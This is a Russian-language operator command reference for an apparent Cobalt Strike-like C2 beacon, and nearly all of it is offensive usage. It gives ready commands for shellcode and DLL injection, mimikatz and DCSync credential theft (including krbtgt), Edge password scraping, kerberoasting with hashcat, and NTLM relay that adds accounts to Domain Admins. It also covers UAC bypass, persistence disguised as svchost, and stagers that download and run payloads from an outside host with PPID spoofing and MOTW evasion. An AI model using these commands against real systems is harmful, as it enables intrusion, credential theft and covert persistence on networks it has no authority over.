Справочник команд beacon'а

Все команды ставятся в очередь и выполняются beacon'ом по порядку.

Файловая система

КомандаАргументыОписание

cd<path>Сменить рабочий каталог.

Выполнение кода

shell(без аргумента)Войти в интерактивный cmd.exe.

Shellcode-инъекции

inject<pid> <file> Выполнить shellcode в чужом процессе.
inject_apc<pid> <file> APC-инъекция по всем потокам PID.
spawnto<file> [path] Sacrificial process: запустить жертвенный процесс и выполнить shellcode в нём. Дефолтное имя процесса-приманки — rundll32.exe.
modstomp<file> [dll] Module stomping: загрузить подписанный модуль и выполнить shellcode в его памяти.

Inject DLL (рефлективная загрузка)

inject_dll<dll_path> [args...] Fork & Run: запускается жертвенный процесс, в нём рефлективно загружается DLL. Если аргументы переданы — вызывается экспорт mimikatz, вывод перехватывается и приходит в консоль оператора.
inject_dll<dll_path> --spawnto <PID> [args...] Инъекция в существующий процесс: DLL загружается рефлективно прямо в адресное пространство <PID>, вывод перехватывается через именованный пайп.

В отличие от inject/spawnto (запуск shellcode), inject_dll грузит произвольный PE DLL целиком в память: маппирует образ, исправляет релокации, разрешает импорты и вызывает указанный экспорт.

Привилегии

СценарийКакой токен у DLL внутриДоступ к LSASS
Fork & Run Токен бикона (наследуется жертвенным процессом). Если у бикона SeDebugPrivilege — да.
--spawnto <PID> Токен целевого процесса. Только если в этом токене присутствует SeDebugPrivilege; большинство Medium IL пользовательских процессов его не имеют.
Самый прямой путь к sekurlsa::logonpasswords: privesc_admin → fork & run. Жертвенный процесс наследует High IL токен бикона, mimikatz открывает LSASS без проблем. PID-инъекция без privesc почти всегда упрётся в ERROR_ACCESS_DENIED (0x05) внутри kuhl_m_sekurlsa_acquireLSA.

Примеры

# Mimikatz fork & run (нужен SeDebug у бикона)
inject_dll bof\bibikatz\powerkatz.dll sekurlsa::logonpasswords exit
inject_dll bof\bibikatz\powerkatz.dll lsadump::sam exit
inject_dll bof\bibikatz\powerkatz.dll "kerberos::list /export" exit

# Произвольная DLL — выполнится точка входа DLL
inject_dll C:\payloads\my_dll.dll

# PID-инъекция (нужны права записи в адресное пространство цели)
inject_dll bof\bibikatz\powerkatz.dll --spawnto 4128 sekurlsa::logonpasswords exit
DLL читается с диска оператора и передаётся внутрь сессии — на целевой машине файла нет ни до, ни после; образ живёт только в памяти жертвенного/целевого процесса. После завершения экспорта в fork & run жертвенный процесс уничтожается; в PID-режиме целевой процесс остаётся жить — оператору следует это учитывать.

Migrate

migrate<pid> Рефлективная миграция beacon'а в целевой процесс. Текущий beacon упаковывает свой образ в payload, инжектирует его в <pid>, дожидается чек-ина нового beacon'а на teamserver и завершает старый процесс.

В отличие от inject, migrate переносит сам beacon, а не произвольный shellcode: новый процесс наследует текущую сессию, параметры sleep/jitter и накопленные данные. В Sessions старая строка отмечается dead, новая поднимается с тем же beacon_id.

PID-цель должен быть совместим по архитектуре (x64) и integrity-уровню (нельзя мигрировать из Medium IL в System без предварительного steal_token/privesc_*). Если у текущего токена нет SeDebugPrivilege, миграция в чужой процесс завершится ошибкой доступа.

BOF (Beacon Object Files)

bof<name> [entry] [-- fmt arg1 arg2 ...] Загрузить COFF в память и вызвать entry (по умолчанию go).

Автопоиск файла

Если файл не найден по указанному пути, клиент рекурсивно ищет его в каталоге bof/. Расширение .o можно не указывать.

bof whoami.x64.o                        — поиск по имени
bof whoami                              — пробует .o, .x64.o, .x86.o
bof bof
alf-bof\SAL-BOF\whoami.x64.o  — полный путь

Совместимо с Cobalt Strike BOF API. Внешние DLL-функции (KERNEL32, MSVCRT и т.д.) подгружаются автоматически.

Execute-Assembly (.NET)

execute-assembly<path.exe> [args...] Загрузить .NET-сборку с диска оператора и выполнить в beacon-процессе через CLR hosting.

Сборка передаётся байтами в память — файл на диске цели не создаётся.

Загрузка CLR-рантайма демаскирует процесс как .NET host. Рекомендуется spawnto + execute-assembly в дочернем процессе.

Pivot и цепочки ретрансляции

КомандаАргументыОписание
tcp_pivot<host> <port> Открыть raw-TCP-канал к pivot-listener'у на teamserver'е. Позволяет beacon'у в изолированном сегменте достучаться до teamserver'а через beacon-посредника.

Многоуровневые цепочки (relay chain)

Co2H поддерживает произвольно глубокие цепочки:

Machine3 ─TCP pivot─> Machine2 ─TCP pivot─> Machine1 ─HTTPS─> teamserver

Каждый «родительский» beacon автоматически становится TCP-ретранслятором для «дочерних». Сервер рекурсивно разворачивает вложенные relay-кадры и маршрутизирует данные к нужному beacon'у по beacon_id. Оператор видит все три beacon'а как независимые сессии в таблице Sessions и может выдавать задачи каждому в обычном режиме.

Настройка цепочки 3 хопа:
1. Machine1 уже имеет HTTPS beacon, TCP-listener активен на teamserver'е (например, порт 4444).
2. На Machine1 запустить TCP Pivot listener через UI: Listeners → New → Pivot → порт 5555.
3. На Machine2 запустить beacon с транспортом TCP, нацеленным на machine1:5555. Beacon Machine2 появится в Sessions.
4. На Machine2 аналогично создать pivot-listener (порт 6666).
5. На Machine3 запустить beacon → machine2:6666. Beacon Machine3 появится.

Ограничение: каждый beacon-ретранслятор в цепочке добавляет RTT; при sleep 0 все три хопа выполняют задачи в реальном времени. Рекомендуется sleep не ниже 500 мс на промежуточных beacon'ах во избежание переполнения буферов TCP.

Токены и привилегии

КомандаАргументыОписание
getuidТекущий пользователь / SID.
steal_token<pid> Скопировать токен указанного процесса. После выполнения команды shell и run запускают дочерние процессы от имени владельца скопированного токена, а не от имени beacon-процесса. Сетевые обращения также выполняются от скопированного удостоверения. Требует SeDebugPrivilege.
priv_all Включить все привилегии, присутствующие в текущем токене. По умолчанию Windows оставляет большинство привилегий отключёнными, даже если они входят в состав токена.
Типичный порядок работы:
steal_token <pid> → priv_all → команды работают с полным набором привилегий (SeLoadDriverPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege и т.д.).
make_token<DOMAIN\user> <pass> Создать сетевой токен с указанными учётными данными. Действует для исходящих сетевых обращений и для дочерних процессов (аналогично steal_token).
rev2self Сбросить имперсонацию. Дочерние процессы снова запускаются от имени beacon-процесса.
Важно: steal_token меняет удостоверение для дочерних процессов (shell, run) и для сетевых обращений, но не меняет первичный токен самого beacon-процесса. В столбце USER таблицы Sessions по-прежнему будет виден оригинальный пользователь — это ожидаемое поведение.

Типичный маршрут к SYSTEM:
steal_token 564  (winlogon.exe)
priv_all
shell whoami /all  → видим NT AUTHORITY\СИСТЕМА со всеми включёнными привилегиями

Дамп учётных данных

hashdump

КомандаАргументыОписание
hashdump Включает SeBackupPrivilege и сохраняет кусты реестра SAM, SYSTEM, SECURITY в %TEMP%\sam.hiv / system.hiv / security.hiv. Забрать файлы командой download и распарсить офлайн.

edge_creds

КомандаАргументыОписание
edge_creds Извлечение сохранённых паролей из памяти процесса msedge.exe.

Microsoft Edge хранит все сохранённые пароли в открытом виде в куче браузерного процесса, даже если пользователь не заходил на эти сайты в текущей сессии. Microsoft квалифицирует это как intended behaviour.

Механизм:

  1. Перечисление процессов через CreateToolhelp32Snapshot → поиск msedge.exe
  2. OpenProcess(PROCESS_VM_READ) — читаем из-под текущего пользователя
  3. VirtualQueryEx + ReadProcessMemory — сканирование committed-страниц
  4. Поиск паттерна: URL\0scheme\0username\0password\0 в куче

Формат вывода:

  URL:  https://example.com/login
  User: user@example.com
  Pass: P@ssw0rd123
Привилегии: не требует повышения — работает от имени текущего пользователя (того же, кто запустил Edge).
Обнаружение: ReadProcessMemory может вызвать срабатывание EDR-хуков на кросс-процессное чтение. Некоторые EPP мониторят доступ к процессам браузеров.
Требует SYSTEM или elevated-процесс с SeBackupPrivilege.
Парсинг офлайн:
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
mimikatz lsadump::sam /system:system.hiv /sam:sam.hiv

Kerberos-билеты

Все ticket-команды работают через Kerberos SSP в текущей logon-сессии. Прав SYSTEM не требуют.

КомандаАргументыОписание
ticket_list Список всех билетов текущей сессии: ServerName @ Realm, EncryptionType.
ticket_dump[spn] Извлечь билет как base64-encoded .kirbi. Без аргумента — TGT (krbtgt/REALM). С аргументом — сервисный билет для SPN, например cifs/dc01.corp.local.
ticket_use<base64> Pass-the-ticket: импортировать .kirbi (base64) в кеш текущей сессии. Совместим с mimikatz kerberos::ptt и Rubeus.
ticket_purge Очистить весь кеш билетов текущей сессии.
Сценарий pass-the-ticket:
1. ticket_dump cifs/fileserver.corp.local → получить base64
2. Добавить в Credentials store (kind: ticket) для хранения
3. На другом beacon: ticket_use <base64>
4. ls \\fileserver\share — доступ с чужим билетом

Kerberoasting

Перечисляет через LDAP все учётные записи с непустым servicePrincipalName и для каждой запрашивает TGS-билет. Зашифрованная часть билета выводится в формате hashcat без обращения к LSASS.

КомандаАргументыОписание
kerberoast [domain] Без аргумента — домен из переменной окружения. С аргументом — использует указанный домен. Ищет активные учётные записи с SPN через LDAP.
Требования: любая доменная сессия (без прав DA).

Типичный сценарий:
kerberoast CORP.LOCAL
→ вывод для RC4-аккаунтов:
$krb5tgs$23$*svc_sql*CORP.LOCAL*MSSQLSvc/sql01:1433*<checksum>$<data>

Взлом:
hashcat -m 13100 hashes.txt wordlist.txt — RC4 (etype 23)
hashcat -m 19600 hashes.txt wordlist.txt — AES-128 (etype 17)
hashcat -m 19700 hashes.txt wordlist.txt — AES-256 (etype 18)

При AES-256 хэш взламывается значительно медленнее — приоритет отдавать аккаунтам с adminCount=1 или устаревшими (pwdLastSet > 180 дней).

После взлома пароля — make_token CORP\svc_sql <пароль> или dcsync CORP.LOCAL svc_sql для NT-хеша.

NTLM relay / Coercion

Обе команды поднимают внутренний NTLM-relay-сервер на beacon-машине, принудительно вынуждают цель аутентифицироваться через MS-EFSR и ретранслируют учётные данные на LDAP-порт DC.

КомандаАргументыОписание
ldap_addda <dc_ip> <beacon_ip> <user_dn> <group_dn> [port=445] Coerce DC → relay его NTLM на LDAP → выполняет AddMember — добавляет user_dn в группу group_dn (например, в CN=Domain Admins,CN=Users,DC=…). Нужна учётная запись, имеющая право на самокоэрсинг DC (обычно любой пользователь домена на непропатченном хосте).
ldap_rbcd <dc_ip> <beacon_ip> <coerce_ip> <target_dn> <attacker_sid> [port=445] Coerce coerce_ip → relay на LDAP DC → пишет атрибут msDS-AllowedToActOnBehalfOfOtherIdentity в объект target_dn (Resource-Based Constrained Delegation). После этого атакующий аккаунт может запросить S4U2proxy-билет для любого сервиса на цели.
Типичный сценарий ldap_addda:
ldap_addda 192.168.1.1 192.168.1.50 "CN=jdoe,CN=Users,DC=corp,DC=local" "CN=Domain Admins,CN=Users,DC=corp,DC=local"

Типичный сценарий ldap_rbcd:
ldap_rbcd 192.168.1.1 192.168.1.50 192.168.1.10 "CN=fileserver,CN=Computers,DC=corp,DC=local" S-1-5-21-…-1234

MS-EFSR-принудительная аутентификация работает против непропатченных систем (без KB5005413/KB5005565). Relay LDAP→LDAPS требует отсутствия LDAP signing (по умолчанию Required на современных DC).

DCSync (MS-DRSR)

Реплицирует секреты пользователя прямо с DC по протоколу MS-DRSR. Не касается LSASS — только RPC. Вывод в формате secretsdump.

КомандаАргументыОписание
dcsync <domain> <username> Получить NT-хеш пользователя через MS-DRSR репликацию. Аутентификация: Kerberos (fallback NTLM), зашифрованный транспорт.
Требования к токену: Domain Admin или явное право DS-Replication-Get-Changes + DS-Replication-Get-Changes-All на NC домена.

Типичный маршрут:
steal_token <PID DA-процесса>
dcsync CORP.LOCAL Administrator
dcsync CORP.LOCAL krbtgt ← golden ticket

Вывод:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT-хеш>:::

Использование хеша (PTH):
make_token CORP\Administrator /ntlm:<NT-хеш>

Если выводит no_session_key — проблема получения ключа сессии (бывает при NTLM). При Kerberos работает стабильно.

ADCS Enumeration (ESC1-16)

Сканер мисконфигураций Active Directory Certificate Services. Без админских прав ищет уязвимые шаблоны сертификатов, неправильно настроенные центры сертификации, слабые правила маппинга на DC и доступный Web Enrollment. Покрывает 14 классов уязвимостей семейства ESC.

КомандаАргументыОписание
adcs_enum [domain] Без аргумента — текущий домен. С аргументом — указанный домен. Ближайший контроллер домена выбирается автоматически.

Что проверяется

ESCЧто ищется
ESC1 Шаблон позволяет клиенту задать произвольный SAN (UPN/DNS) и имеет EKU для аутентификации (Client Auth, Smart Card Logon, PKINIT). Низкопривилегированный пользователь может его выписать → выпуск сертификата на любой аккаунт домена.
ESC2 Шаблон выписывает сертификат с Any Purpose EKU или вообще без ограничений EKU. Низкопривилегированный enroll → сертификат пригоден для подделки чего угодно.
ESC3 Шаблон с EKU Certificate Request Agent. Позволяет подписывать чужие запросы (enroll-on-behalf-of) и выписывать сертификаты на других пользователей.
ESC4 Не-админский принципал имеет права на изменение шаблона (GenericWrite, WriteDACL, WriteOwner и т.п.). Атакующий сам превращает шаблон в ESC1.
ESC5 Не-админ имеет write на инфраструктурные контейнеры PKI в AD (Public Key Services, NTAuth, корневые CA). Полный контроль над PKI.
ESC6 На центре сертификации включён режим, при котором CA принимает альтернативные имена напрямую из атрибутов запроса. Любой шаблон становится эквивалентом ESC1.
ESC7 Не-админ имеет права записи на AD-объект CA. Возможна модификация шаблонов и параметров центра сертификации.
ESC8 Web Enrollment endpoint (/certsrv/) доступен по HTTP/HTTPS. HTTP 401 указывает на возможность NTLM-relay.
ESC9 Шаблон выпускает сертификат без SID-расширения. Обходит обязательную строгую привязку (введённую KB5014754) и позволяет ESC1 на современных DC.
ESC10 На контроллере домена ослаблены правила соответствия сертификата пользователю — DC принимает слабую UPN-привязку даже без SID-расширения.
ESC11 На CA не включено обязательное шифрование RPC-запросов на выпуск сертификатов. Возможен relay через принуждение (coercion).
ESC13 Application-policy шаблона связана с группой безопасности AD. Получение сертификата по такому шаблону автоматически даёт членство в этой группе.
ESC15
(EKUwu)		 Шаблон старого формата (schema v1) с возможностью клиенту задавать SAN (CVE-2024-49019). V1 не проверяет EKU из запроса — клиент подсунет произвольные application policies.
ESC16 На центре сертификации глобально отключено добавление SID-расширения. Все выпускаемые сертификаты обходят строгую привязку.
Требования: любая доменная сессия (без прав DA). Часть проверок обращается к реестру центра сертификации и контроллера домена — для них нужна служба удалённого реестра на этих машинах (или сам бикон должен работать на них). При отсутствии доступа к реестру эти проверки тихо пропускаются.

Типичный сценарий:
adcs_enum — текущий домен
adcs_enum corp.local — явное указание

Пример вывода:
[ESC1] WebServer-Vuln
       Flag:   CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (arbitrary SAN)
       EKU:    Client Authentication
       Enroll: CORP\Domain Users (Enroll)

Шаблоны, существующие в AD, но не опубликованные ни на одном CA, помечаются отдельно — CA отклонит запрос, эксплуатация невозможна.

Что не покрыто: ESC12 (offline-сценарий с аппаратным HSM, не применим к сетевой энумерации) и ESC14 (специфика Samba, не воспроизводится на Microsoft CA).

Lateral Movement

wmiexec <target> <command> Запускает команду через WMI Win32_Process::Create. Не создаёт сервис — тише psexec.
Требует Local Admin на цели.
dcomexec <target> <command> Запускает команду через удалённый DCOM-объект MMC20.Application.
Не требует активной сессии пользователя. Использует порт 135 (DCOM endpoint mapper).
Требует Local Admin на цели.
winrmexec <target> <command> Подключается к http://target:5985/wsman и выполняет команду через WinRM.
Требует WinRM HTTP (порт 5985) + Local Admin на цели.
Активировать WinRM на цели: winrm quickconfig.
Типичный сценарий:
steal_token <PID с LocalAdmin-токеном>
psexec_cmd 192.168.1.20 whoami
wmiexec fileserver.corp.local ipconfig /all
dcomexec 192.168.1.20 "net user hacker P@ssw0rd! /add"
winrmexec 192.168.1.20 hostname

Порты:
  • psexec_cmd, wmiexec, dcomexec — 445 (SMB для ADMIN$) + 135/dynamic (DCOM/WMI/SCM)
  • winrmexec — 5985 (HTTP) или 5986 (HTTPS)
Включить WinRM на цели:
winrm quickconfig -q

Тайм-аут ожидания вывода: psexec/wmi/dcom — 15 с, winrm — 30 с.

Port Forward

Открывает TCP-слушатель на beacon-машине и прозрачно проксирует каждое входящее соединение к заданному удалённому хосту и порту. Работает в фоновом потоке — beacon продолжает принимать задачи. Одновременно поддерживается до 8 правил.

КомандаАргументыОписание
portfwd add <lport> <rhost> <rport> Создать правило: слушать 0.0.0.0:lport, каждое соединение пробрасывать в rhost:rport.
portfwd del <lport> Удалить правило: закрыть слушатель, разорвать все существующие проксированные соединения.
portfwd list (или просто portfwd) Показать список активных правил.
Сценарий: доступ к RDP за beacon'ом
portfwd add 13389 10.10.10.5 3389
mstsc /v:beacon-ip:13389

Сценарий: туннель к внутреннему веб-серверу
portfwd add 18080 internal-app.corp.local 80
curl http://beacon-ip:18080/

Reverse Port Forward

Teamserver открывает TCP-порт (bind); при входящем подключении трафик идёт через C2-канал к beacon'у, который пробрасывает его к rhost:rport. Архитектурно — зеркало SOCKS5: клиент подключается к teamserver'у, а не к прокси-клиенту оператора.

Способ созданияОписание
Sessions → правый клик → Start Reverse Port Forward… Диалог: Bind host и Bind port — что откроет teamserver; Rhost и Rport — цель, к которой подключается beacon. После нажатия OK teamserver начинает слушать. При первом входящем подключении beacon устанавливает соединение с rhost:rport.
Схема трафика:
внешний клиент → teamserver:bind_port → (C2-канал) → beacon → rhost:rport

Пример — доступ к внутреннему веб-серверу через teamserver:
Bind host: 0.0.0.0, Bind port: 8080, Rhost: internal-webapp.corp.local, Rport: 80
curl http://teamserver-ip:8080/

Отличие от SOCKS5: SOCKS5 туннелирует произвольный трафик через polling-цикл; rportfwd открывает конкретный порт напрямую на teamserver'е, не требует SOCKS5-клиента, работает для любого TCP-протокола.

Повышение привилегий

КомандаАргументыОписание
privesc_admin UAC bypass через hijack реестрового ключа HKCU. Текущий исполняемый файл перезапускается с High Integrity. Ключ реестра удаляется после запуска.
privesc_system Кража токена winlogon.exe и запуск нового экземпляра beacon'а от имени SYSTEM в активной консольной сессии. Требует SeDebugPrivilege (elevated-процесс или Administrator).

Результат: новый beacon от имени NT AUTHORITY\SYSTEM в текущей сессии пользователя.

privesc_plasma — детали

Команда выполняет многоступенчатую атаку (3 этапа), полностью автоматизированную. Каждый этап запускается как отдельный дочерний процесс с таймаутом 30 секунд.

Требования:

  • Windows 10 версии 1903–20H2 (Cloud Files API доступен и уязвим).
  • Никаких привилегий не нужно — достаточно обычного пользователя (Medium IL).
  • Компонент Cloud Files (cldapi.dll) должен быть загружаем.

Результат: в таблице Sessions появляется новый beacon с user = SYSTEM, привязанный к текущей сессии (SessionId сохраняется).

Создаёт несколько дочерних процессов (этапы 1–3), временные каталоги в %TEMP% и вызывает schtasks.exe. Может быть обнаружена по: необычной записи в Volatile Environment, появлению нестандартного wermgr.exe вне C:\Windows\System32, запуску WER-задачи не из штатного контекста.

Persistence (закрепление)

Три механизма автозапуска на стороне цели: реестровый ключ Run, Scheduled Task и WMI event subscription. Реестр и Task Scheduler работают в контексте текущего пользователя без прав администратора. WMI-подписка требует Local Admin и срабатывает даже без входа пользователя.

КомандаАргументыОписание
persist_reg <name> <path> Записывает значение в HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Автозапуск при каждом входе текущего пользователя.
persist_task <name> <path> Создаёт Scheduled Task через Task Scheduler API. Триггер: Logon. Hidden, без повышения привилегий, запуск при наличии сети.
persist_wmi <name> <interval_sec> <exe_path> WMI event subscription в ROOT\subscription. Создаёт три объекта:
  • __EventFilter — срабатывает каждые ~interval_sec секунд.
  • ActiveScriptEventConsumer — запускает exe_path.
  • __FilterToConsumerBinding — связывает фильтр и консьюмер.
Срабатывает каждые ~interval_sec секунд. Выполняется от имени SYSTEM через WMI-сервис. Требует Local Admin.
Удаление:
wmic /namespace:\\root\subscription path __EventFilter where "Name='<name>'" delete
wmic /namespace:\\root\subscription path ActiveScriptEventConsumer where "Name='<name>'" delete
wmic /namespace:\\root\subscription path __FilterToConsumerBinding where "Filter=""__EventFilter.Name='<name>'""" delete
Примеры:
persist_reg edge_update C:\Users\%USERNAME%\AppData\Local\Temp\svchost.exe
persist_task OneDriveUpdater C:\Users\%USERNAME%\AppData\Roaming\Microsoft\svchost.exe
persist_wmi WindowsUpdate 60 C:\Windows\Temp\svchost.exe

Обнаружение:
  • Registry Run key → Sysmon событие 13 (RegistryEvent)
  • Scheduled Task → Windows Security лог, событие 4698 (Task created)
  • WMI subscription → Sysmon событие 19/20/21 (WmiEvent); также Microsoft-Windows-WMI-Activity/Operational
Для снижения заметности: маскировать имя под системное (MicrosoftEdgeUpdateCore, WindowsDefenderUpdate) и хранить исполняемый файл в стандартных системных каталогах (%WINDIR%\Temp\, %APPDATA%\Microsoft\Windows\).

Стейджеры (spawn через интерпретатор)

Команды создают файл-доставщик на диске цели и немедленно запускают его через соответствующий Windows-интерпретатор. Запуск выполняется с PPID-спуфингом: родителем нового процесса становится explorer.exe, а не beacon. Интерпретатор скачивает полезную нагрузку с указанного URL и запускает её.

Дерево процессов с точки зрения EDR:

explorer.exe
  └─ mshta.exe / wscript.exe / hh.exe / cmd.exe
       └─ payload.exe
КомандаАргументыИнтерпретаторОписание
stager_lnk <url> <out_path> [--rm-after] cmd.exe /c start /b Создаёт .lnk — цель cmd.exe, аргументы: скачать URL через PowerShell и запустить.
stager_hta <url> <out_path> [--rm-after] mshta.exe Создаёт HTML Application (.hta). VBScript внутри скачивает URL и запускает payload. Окно скрыто, самозакрывается.
stager_vbs <url> <out_path> [--rm-after] wscript.exe //nologo //b Создаёт VBScript (.vbs): скачивает URL и запускает payload. Флаг //b — batch mode, без диалогов.
stager_wsf <url> <out_path> [--rm-after] wscript.exe //nologo //b Создаёт Windows Script File (.wsf): XML-обёртка над VBScript. wscript воспринимает WSF как допустимый тип — меньше срабатываний по расширению, чем у .vbs.
stager_iso <url> <out_path> [--rm-after] powershell.exe (Mount-DiskImage) Создаёт ISO-образ. Внутри — launch.lnk. Файлы в ISO не получают MOTW (Mark of the Web) при монтировании — Defender не помечает как «из интернета». PowerShell монтирует образ и запускает launch.lnk.
stager_chm <url> <out_path> [--rm-after] hh.exe Создаёт CHM-файл через hhc.exe (HTML Help Compiler). Содержимое: HTML со скриптом, который скачивает и запускает payload. Требует hhc.exe на целевой машине (HTML Help Workshop или Windows SDK).

Флаг --rm-after

Если указан --rm-after, beacon удаляет файл с диска через 500 мс после запуска интерпретатора — достаточно, чтобы mshta.exe / wscript.exe успел прочитать скрипт. Без флага файл остаётся на диске; оператор может забрать его командой download или удалить вручную через rm.

PPID-спуфинг

Каждый интерпретатор запускается с PPID-спуфингом на первый найденный экземпляр explorer.exe. В диспетчере задач, Process Hacker и Sysmon родителем процесса будет explorer.exe, а не beacon. Если explorer.exe недоступен (серверная сессия без GUI), выполняется запуск без спуфинга.

Примеры:
stager_hta http://192.168.1.10:8080/s.exe C:\Temp\upd.hta --rm-after
stager_vbs http://192.168.1.10:8080/s.exe C:\ProgramData\svc.vbs --rm-after
stager_wsf http://192.168.1.10:8080/s.exe "%APPDATA%\Microsoft\upd.wsf" --rm-after
stager_lnk http://192.168.1.10:8080/s.exe "C:\Users\Public\doc.lnk"
stager_iso http://192.168.1.10:8080/s.exe C:\Temp\archive.iso --rm-after
stager_chm http://192.168.1.10:8080/s.exe C:\Temp\help.chm --rm-after

Требования stager_iso: Windows 8+ (IMAPI2 + PowerShell Mount-DiskImage требует PS 3.0).
Требования stager_chm: hhc.exe (HTML Help Workshop) на целевой машине.

Управление beacon'ом

КомандаАргументыОписание
sleep<ms> [jitter] Период callback'ов в мс, jitter 0–100 %. Пример: sleep 30000 20.
exit Плавное завершение beacon'а. Beacon сигнализирует о завершении, отправляет финальный ответ и заканчивает работу по окончании текущей итерации цикла. Если beacon находится в долгом сне — ждёт до пробуждения.
kill Немедленное уничтожение beacon-процесса без ожидания и без отправки финального ответа. Используется когда beacon завис в длительной операции или когда нужно гарантированно и быстро уничтожить процесс. После kill сессия в Sessions отмечается как потерянная после следующего тайм-аута heartbeat.
